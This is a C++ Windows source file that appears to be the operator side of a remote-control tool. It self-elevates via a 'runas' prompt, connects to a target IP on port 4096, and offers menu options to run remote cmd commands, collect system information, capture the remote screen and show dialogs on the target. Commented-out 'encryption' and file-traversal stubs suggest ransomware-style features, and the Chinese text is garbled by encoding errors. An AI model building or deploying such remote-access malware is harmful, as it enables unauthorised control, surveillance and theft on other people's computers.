#define _AFXDLL
#include <iostream>
#include <sstream>
#include <afxext.h>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

//void encryption(char* fileName);
//void traverFile(char* pathName);
//��ȡ����ԱȨ��
void GainAdminPrivileges(CString strApp) {
	SHELLEXECUTEINFO execinfo;
	memset(&execinfo, 0, sizeof(execinfo));
	execinfo.lpFile = strApp;
	execinfo.cbSize = sizeof(execinfo);
	execinfo.lpVerb = _T("runas");
	execinfo.fMask = SEE_MASK_NO_CONSOLE;
	execinfo.nShow = SW_SHOWDEFAULT;

	ShellExecuteEx(&execinfo);
}

BOOL ExeIsAdmin() {
#define ACCESS_READ 1
#define ACCESS_WRITE 2
	HANDLE hToken;
	DWORD dwStatus;
	DWORD dwAccessMask;
	DWORD dwAccessDesired;
	DWORD dwACLSize;
	DWORD dwStructureSize = sizeof(PRIVILEGE_SET);
	PACL pACL = NULL;
	PSID psidAdmin = NULL;
	BOOL bReturn = FALSE;
	PRIVILEGE_SET ps;
	GENERIC_MAPPING GenericMapping;
	PSECURITY_DESCRIPTOR psdAdmin = NULL;
	SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;

	if (!ImpersonateSelf(SecurityImpersonation))
		goto LeaveIsAdmin;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
		if (GetLastError() != ERROR_NO_TOKEN)
			goto LeaveIsAdmin;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			goto LeaveIsAdmin;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			goto LeaveIsAdmin;
	}

	if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &psidAdmin))
		goto LeaveIsAdmin;

	psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (psdAdmin == NULL)
		goto LeaveIsAdmin;

	if (!InitializeSecurityDescriptor(psdAdmin,
		SECURITY_DESCRIPTOR_REVISION))
		goto LeaveIsAdmin;

	dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
		GetLengthSid(psidAdmin) - sizeof(DWORD);

	pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
	if (pACL == NULL)
		goto LeaveIsAdmin;

	if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
		goto LeaveIsAdmin;

	dwAccessMask = ACCESS_READ | ACCESS_WRITE;

	if (!AddAccessAllowedAce(pACL, ACL_REVISION2, dwAccessMask, psidAdmin))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE))
		goto LeaveIsAdmin;
	if (!SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE))
		goto LeaveIsAdmin;

	if (!IsValidSecurityDescriptor(psdAdmin))
		goto LeaveIsAdmin;

	dwAccessDesired = ACCESS_READ;

	GenericMapping.GenericRead = ACCESS_READ;
	GenericMapping.GenericWrite = ACCESS_WRITE;
	GenericMapping.GenericExecute = 0;
	GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;

	if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
		&GenericMapping, &ps, &dwStructureSize, &dwStatus, &bReturn))
		goto LeaveIsAdmin;

	if (!RevertToSelf())
		bReturn = FALSE;
LeaveIsAdmin:
	if (pACL) LocalFree(pACL);
	if (psdAdmin) LocalFree(psdAdmin);
	if (psidAdmin) FreeSid(psidAdmin);

	return bReturn;
}

int main() {
	int nRet;
	char ExePath_c[MAX_PATH] = {};
	GetModuleFileName(NULL, ExePath_c, MAX_PATH);
	string ExePath_str = ExePath_c;

	string::size_type pos = 0;
	while ((pos = ExePath_str.find('\\', pos)) != string::npos) {
		ExePath_str.insert(pos, "\\");
		pos = pos + 2;
	}

	char ExePath[MAX_PATH] = {};
	for (int i = 0; i < ExePath_str.size(); i++)
		ExePath[i] = ExePath_str[i];

	CString ExePath_cstr = ExePath;
	if (!ExeIsAdmin()) {
		GainAdminPrivileges(ExePath_cstr);
		return 0;
	}
	//��ɫ����������ʮ����������ָ�� -- ��һ��Ϊ�������ڶ�����Ϊǰ����ÿ�����ֿ���Ϊ�����κ�ֵ֮һ: 0 = ��ɫ 8 = ��ɫ 1 = ��ɫ 9 = ����ɫ 2 = ��ɫ A = ����ɫ 3 = ����ɫ B = ��ǳ��ɫ 4 = ��ɫ C = ����ɫ 5 = ��ɫ D = ����ɫ 6 = ��ɫ E = ����ɫ 7 = ��ɫ F = ����ɫ 
	//system("color 02");����������Ǻڵ�����
	system("color 59");
	char ip[1024] = {};
	cout << "************************************************************************************************************************" << endl;
	cout << "                                                ����������Ҫ���Ƶĵ��Ե�IP:" << endl;
	cin >> ip;

	WSADATA wsdata;
	nRet = WSAStartup(MAKEWORD(2, 2), &wsdata);
	if (nRet != 0) {
		cout << "WSAStartup() ʧ�ܣ� " << nRet << endl;
		return -1;
	}

	SOCKET hSock = socket(PF_INET, SOCK_STREAM, 0);

	SOCKADDR_IN servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr(ip);
	servAddr.sin_port = htons(4096);

	nRet = connect(hSock, (SOCKADDR*)&servAddr, sizeof(servAddr));
	if (nRet == SOCKET_ERROR) {
		cout << "����ʧ�ܣ� " << WSAGetLastError() << endl;
		closesocket(hSock);
		WSACleanup();
		return -1;
	}
	int x;
	string s;
	while (true) {
		char IP[1024] = {};
		char Check[1024] = {};
		recv(hSock, IP, 1024, 0);
		system("cls");
		while (recv(hSock, Check, 1024, 0) != -1) {
			cout << "************************************************************************************************************************" << endl;
			cout << "*****************************************************Զ�̿���ϵͳ*******************************************************" << endl;
			cout << "************************************************************************************************************************" << endl;
			cout << "                                                Ŀ�������ӣ�IPΪ:" << IP << endl;
			cout << "                                                ��ѡ����Ҫִ�еĹ��ܣ�\n";
			cout << "                                                1. cmd����" << endl;
			cout << "                                                2. ��ȡϵͳ�汾��Ϣ" << endl;
			cout << "                                                3. �����ļ���" << endl;
			cout << "                                                4. ���ֲ���" << endl;
			cout << "                                                5. �������" << endl;
			cout << "                                                6. ��ȡ��Ļ��ͼ" << endl;
			cout << "                                                7. �����Ի���" << endl;
			cout << "                                                8. �˳�����" << endl << endl;
			cout << "************************************************************************************************************************" << endl;
			cout << "********************************************************END*************************************************************" << endl;
			cout << "************************************************************************************************************************" << endl;

			cin >> x;
			if (x < 1 || x > 8) continue;
			s = "";
			s[0] = x + '0';

			send(hSock, s.c_str(), 1024, 0);
			if (x == 1) {
				cout << "������cmd���" << endl;
				getline(cin, s);
				getline(cin, s);
				send(hSock, s.c_str(), 1024, 0);
			}
			if (x == 2) {
				char title[] = "�ͻ��˰汾��Ϣ";
				char buf[1024];
				std::ofstream out("systeminfo.txt", std::ios::binary);
				//while (true)
				//{
				int len = recv(hSock, buf, sizeof(buf), 0);
				//if (len <= 0)
					//break;
				out.write(buf, len);
				MessageBox(NULL, buf, title, NULL);
				//}
				out.close();
				memset(title, 0, sizeof(title));
				memset(buf, 0, sizeof(buf));

			}
			
			/*if (x == 5) {
				cout << "������Ի������X��" << endl;
				getline(cin, s);
				getline(cin, s);
				send(hSock, s.c_str(), 1024, 0);
				cout << "������Ի�������Y��" << endl;
				getline(cin, s);
				send(hSock, s.c_str(), 1024, 0);
			}*/

		
			if (x == 6)
			{
				char buffer[4096];
				int fileSize;
				int nRecv;

				// �Ƚ����ļ���С
				nRecv = recv(hSock, (char*)&fileSize, sizeof(fileSize), 0);
				if (nRecv != sizeof(fileSize)) {
					cout << "recv() failed: " << WSAGetLastError() << endl;
					closesocket(hSock);
					WSACleanup();
					return -1;
				}

				// �����ļ�����
				ofstream out("screenshot.bmp", ios::binary);
				int remainSize = fileSize;
				while (remainSize > 0) {
					nRecv = recv(hSock, buffer, min(remainSize, sizeof(buffer)), 0);
					if (nRecv <= 0) {
						break;
					}
					out.write(buffer, nRecv);
					remainSize -= nRecv;
				}
				out.close();

			}
			if (x == 7) {
				cout << "������Ի�����⣺" << endl;
				getline(cin, s);
				getline(cin, s);
				send(hSock, s.c_str(), 1024, 0);
				cout << "������Ի������ݣ�" << endl;
				getline(cin, s);
				send(hSock, s.c_str(), 1024, 0);
			}
			else if (x == 8) {
				send(hSock, s.c_str(), 1024, 0);
				break;
			}

			system("cls");
		}

		closesocket(hSock);
		WSACleanup();
		cout << "�Է������ߣ�" << endl;
		Sleep(3000);
		system("cls");
	}

	return 0;
}
